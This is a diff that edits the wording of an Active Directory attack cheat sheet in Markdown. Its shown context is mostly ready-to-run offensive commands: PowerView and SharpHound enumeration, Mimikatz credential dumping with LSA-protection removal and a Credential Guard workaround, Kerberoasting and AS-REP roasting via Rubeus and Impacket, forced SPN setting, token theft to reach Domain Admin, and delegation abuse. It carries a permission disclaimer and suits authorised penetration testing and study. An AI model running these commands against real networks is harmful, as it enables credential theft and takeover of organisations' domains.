@@ -25,9 +25,9 @@ Always ensure you have **explicit** permission to access any computer system **b
 ### Using Active Directory PowerShell Module
 
 * **Get Current Domain:** `Get-ADDomain`
-* **Enum Other Domains:** `Get-ADDomain -Identity <Domain>`
+* **Enumerate other Domains:** `Get-ADDomain -Identity $DomainName`
 * **Get Domain SID:** `Get-DomainSID`
-* **Get Domain Controlers:**
+* **Get Domain Controllers:**
 
   ```text
   Get-ADDomainController
@@ -43,21 +43,21 @@ Always ensure you have **explicit** permission to access any computer system **b
   Get-ADUser -Filter 'Description -like "*pass*"' -Properties Description | select Name, Description
   ```
 
-* **Enum Domain Computers:**
+* **Enumerate Domain Computers:**
 
   ```text
   Get-ADComputer -Filter * -Properties *
   Get-ADGroup -Filter * 
   ```
 
-* **Enum Domain Trust:**
+* **Enumerate Domain Trust:**
 
   ```text
   Get-ADTrust -Filter *
   Get-ADTrust -Identity $DomainName
   ```
 
-* **Enum Forest Trust:**
+* **Enumerate Forest Trust:**
 
   ```text
   Get-ADForest
@@ -67,7 +67,7 @@ Always ensure you have **explicit** permission to access any computer system **b
   (Get-ADForest).Domains
   ```
 
-* **Enum Local AppLocker Effective Policy:**
+* **Enumerate Local AppLocker Effective Policy:**
 
 ```text
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
@@ -76,7 +76,7 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 ### Using [PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/dev/Recon)
 
 * **Get Current Domain:** `Get-NetDomain`
-* **Enum Other Domains:** `Get-NetDomain -Domain $DomainName`
+* **Enumerate other Domains:** `Get-NetDomain -Domain $DomainName`
 * **Get Domain SID:** `Get-DomainSID`
 * **Get Domain Policy:**
 
@@ -119,7 +119,7 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
   Find-DomainUserLocation -Domain $DomainName | Select-Object UserName, SessionFromName
   ```
 
-* **Enum Domain Computers:**
+* **Enumerate Domain Computers:**
 
   ```text
   Get-NetComputer -FullData
@@ -129,7 +129,7 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
   Get-NetComputer -Ping
   ```
 
-* **Enum Groups and Group Members:**
+* **Enumerate Groups and Group Members:**
 
   ```text
   Get-NetGroupMember -GroupName "$GroupName" -Domain $DomainName
@@ -151,7 +151,7 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
   Find-DomainShare -CheckShareAccess
   ```
 
-* **Enum Group Policies:**
+* **Enumerate Group Policies:**
 
   ```text
   Get-NetGPO
@@ -164,14 +164,14 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
   Find-GPOComputerAdmin -ComputerName $ComputerName
   ```
 
-* **Enum OUs:**
+* **Enumerate OUs:**
 
   ```text
   Get-NetOU -FullData 
   Get-NetGPO -GPOname $GPO_GUID
   ```
 
-* **Enum ACLs:**
+* **Enumerate ACLs:**
 
   ```text
   # Returns the ACLs associated with the specified account
@@ -185,14 +185,14 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
   Get-PathAcl -Path $Share_Path
   ```
 
-* **Enum Domain Trust:**
+* **Enumerate Domain Trust:**
 
   ```text
   Get-NetDomainTrust
   Get-NetDomainTrust -Domain $DomainName
   ```
 
-* **Enum Forest Trust:**
+* **Enumerate Forest Trust:**
 
   ```text
   Get-NetForestDomain
@@ -225,17 +225,19 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
   Invoke-UserHunter -CheckAccess
   ```
 
-  ❗ **Priv Esc to Domain Admin with User Hunting:**  
-  I have local admin access on a machine -&gt; A Domain Admin has a session on that machine -&gt; I steal his token and impersonate him -&gt;  
-  Profit!
+  **Escalate Privileges to Domain Admin with User Hunting:**
 
-  [PowerView 3.0 Tricks](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
+  * If you have local admin access on a machine 
+  * If A Domain Admin has a session on that machine 
+  * Steal their token and impersonate them!
+
+[PowerView 3.0 Tricks](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
 
 ### Using BloodHound
 
 ```text
 #Using .exe ingestor
-.\SharpHound.exe --CollectionMethod All --LDAPUser $UserName --LDAPPass $Password --JSONFolder $OutFile_Path>
+.\SharpHound.exe --CollectionMethod All --LDAPUser $UserName --LDAPPass $Password --JSONFolder $OutFile_Path
     
 #Using powershell module ingestor
 .\SharpHound.ps1
@@ -253,10 +255,10 @@ Invoke-BloodHound -CollectionMethod All  -LDAPUser $UserName -LDAPPass $Password
 ## Local Privilege Escalation
 
 * [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1) Misconfiguration Abuse
-* [BeRoot](https://github.com/AlessandroZ/BeRoot) General Priv Esc Enumeration Tool
-* [Privesc](https://github.com/enjoiz/Privesc) General Priv Esc Enumeration Tool
+* [BeRoot](https://github.com/AlessandroZ/BeRoot) General Privilege Escalation Enumeration Tool
+* [Privesc](https://github.com/enjoiz/Privesc) General Privilege Escalation Enumeration Tool
 * [FullPowers](https://github.com/itm4n/FullPowers) Restore a service account's privileges
-* [Juicy Potato](https://github.com/ohpe/juicy-potato) Abuse SeImpersonate or SeAssignPrimaryToken Privileges for System Impersonation
+* [Juicy Potato](https://github.com/ohpe/juicy-potato) Abuse `SeImpersonate` or `SeAssignPrimaryToken` Privileges for System Impersonation
 
   ⚠️ Works only until Windows Server 2016 and Windows 10 until patch 1803
 
@@ -294,7 +296,7 @@ Enter-PSSession -Sessions $SessionName
 
 ```text
 $SecPassword = ConvertTo-SecureString '$Password' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('htb.local\<WtverUser>', $SecPassword)
+$Cred = New-Object System.Management.Automation.PSCredential('$DomainName\$User', $SecPassword)
 Invoke-Command -ComputerName $ComputerName -Credential $Cred -ScriptBlock {whoami /all}
 ```
 
@@ -321,7 +323,14 @@ Invoke-Command -Session $sess -ScriptBlock {$ps = Get-Process}
 Invoke-Command -Session $sess -ScriptBlock {$ps}
 ```
 
-### Mimikatz
+### Useful Tools
+
+* [Powercat](https://github.com/besimorhino/powercat) netcat written in powershell, and provides tunneling, relay and portforward capabilities.
+* [SCShell](https://github.com/Mr-Un1k0d3r/SCShell) fileless lateral movement tool that relies on ChangeServiceConfigA to run command
+* [Evil-Winrm](https://github.com/Hackplayers/evil-winrm) the ultimate WinRM shell for hacking/pentesting
+* [RunasCs](https://github.com/antonioCoco/RunasCs) Csharp and open version of windows builtin runas.exe
+
+## Mimikatz
 
 ```text
 #The commands are in cobalt strike format!
@@ -377,10 +386,9 @@ mimikatz ts::sessions
 mimikatz vault::list
 ```
 
-❗ What if mimikatz fails to dump credentials because of LSA Protection controls ?  
-So far i know two workarounds:
+What if mimikatz fails to dump credentials because of LSA Protection controls ? Two workarounds:
 
-* LSA as a Protected Process
+### LSA as a Protected Process
 
 ```text
 #Check if LSA runs as a protected process by looking if the variable "RunAsPPL" is set to 0x1
@@ -397,7 +405,7 @@ mimikatz # !processprotect /process:lsass.exe /remove
 mimikatz # sekurlsa::logonpasswords
 ```
 
-* LSA is running as virtualized process \(LSAISO\) by Credential Guard
+### LSA is running as virtualized process \(LSAISO\) by Credential Guard
 
 ```text
 #Check if a process called lsaiso.exe exists on the running processes
@@ -413,13 +421,6 @@ mimikatz # misc::memssp
 * [Detailed Mimikatz Guide](https://adsecurity.org/?page_id=1821)
 * [Poking Around With 2 lsass Protection Options](https://medium.com/red-teaming-with-a-blue-team-mentaility/poking-around-with-2-lsass-protection-options-880590a72b1a)
 
-### Useful Tools
-
-* [Powercat](https://github.com/besimorhino/powercat) netcat written in powershell, and provides tunneling, relay and portforward capabilities.
-* [SCShell](https://github.com/Mr-Un1k0d3r/SCShell) fileless lateral movement tool that relies on ChangeServiceConfigA to run command
-* [Evil-Winrm](https://github.com/Hackplayers/evil-winrm) the ultimate WinRM shell for hacking/pentesting
-* [RunasCs](https://github.com/antonioCoco/RunasCs) Csharp and open version of windows builtin runas.exe
-
 ## Domain Privilege Escalation
 
 ### Kerberoast
@@ -427,7 +428,7 @@ mimikatz # misc::memssp
 _All standard domain users can request a copy of all service accounts along with their correlating password hashes, so we can ask a TGS for any SPN that is bound to a "user"  
 account, extract the encrypted blob that was encrypted using the user's password and bruteforce it offline._
 
-* PowerView:
+#### Using PowerView:
 
 ```text
 #Get User Accounts that are used as Service Accounts
@@ -443,20 +444,20 @@ Request-SPNTicket
 Invoke-Mimikatz -Command '"kerberos::list /export"'
 ```
 
-* AD Module:
+#### Using PowerShell AD Module:
 
 ```text
 #Get User Accounts that are used as Service Accounts
 Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
 ```
 
-* Impacket:
+#### Using Impacket:
 
 ```text
 python GetUserSPNs.py $DomainName/$DomainUser:$Password -outputfile $Out_File
 ```
 
-* Rubeus:
+#### Using Rubeus:
 
 ```text
 #Kerberoasting and outputing on a file with a spesific format
@@ -489,7 +490,7 @@ Forcefully Disable Kerberos Preauth on an account I have Write permissions or mo
 We add a filter \(e.g. RDPUsers\) to get "User Accounts" not Machine Accounts, because Machine Account hashes are not crackable!
 {% endhint %}
 
-PowerView:
+#### Using PowerView:
 
 ```text
 Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}
@@ -509,7 +510,7 @@ Get-ASREPHash -UserName $UserName -Verbose
 Invoke-ASREPRoast -Verbose
 ```
 
-Using Rubeus:
+#### Using Rubeus:
 
 ```text
 #For $Format choose either hashcat or john
@@ -524,7 +525,7 @@ Rubeus.exe asreproast /user:$UserName /format:$Format /domain:$DomainName /outfi
 Rubeus.exe asreproast /ou:$OU_Name /format:$Format /domain:$DomainName /outfile:$Out_File
 ```
 
-Using Impacket:
+#### Using Impacket:
 
 ```text
 #Trying the attack for the specified users on the file
@@ -539,14 +540,14 @@ If we have harvest some passwords by compromising a user account, we can use thi
 
 * [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)
 * [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
-* \[Invoke-CleverSpray\]\([https://github.com/wavestone-cdt/Invoke-CleverSpray](https://github.com/wavestone-cdt/Invoke-CleverSpray)\)
+* [Invoke-CleverSpray](https://github.com/wavestone-cdt/Invoke-CleverSpray)
 * [Spray](https://github.com/Greenwolf/Spray)
 
 ### Force Set SPN
 
 _If we have enough permissions -&gt; GenericAll/GenericWrite we can set a SPN on a target account, request a TGS, then grab its blob and brute force it._
 
-* PowerView:
+#### Using PowerView:
 
 ```text
 #Check for interesting permissions on accounts:
@@ -559,7 +560,7 @@ Get-DomainUser -Identity $UserName | select serviceprincipalname
 Set-DomainObject $UserName -Set @{serviceprincipalname='ops/whatever1'}
 ```
 
-* AD Module:
+#### Using PowerShell AD Module:
 
 ```text
 #Check if current user has already an SPN setted
@@ -669,7 +670,7 @@ Rubeus.exe s4u /user:$UserName /rc4:$NTLM_Hash /impersonateuser:$UserToImpersona
 
 Now we can access the service as the impersonated user!
 
-🚩 **What if we have delegation rights for only a spesific SPN? \(e.g TIME\):**
+🚩 **What if we have delegation rights for only a specific SPN? \(e.g TIME\):**
 
 In this case we can still abuse a feature of Kerberos called "alternative service". This allows us to request TGS tickets for other "alternative" services and not only for the one we have rights for. That gives us the leverage to request valid tickets for any service we want that the host supports, giving us full access over the target machine.
 
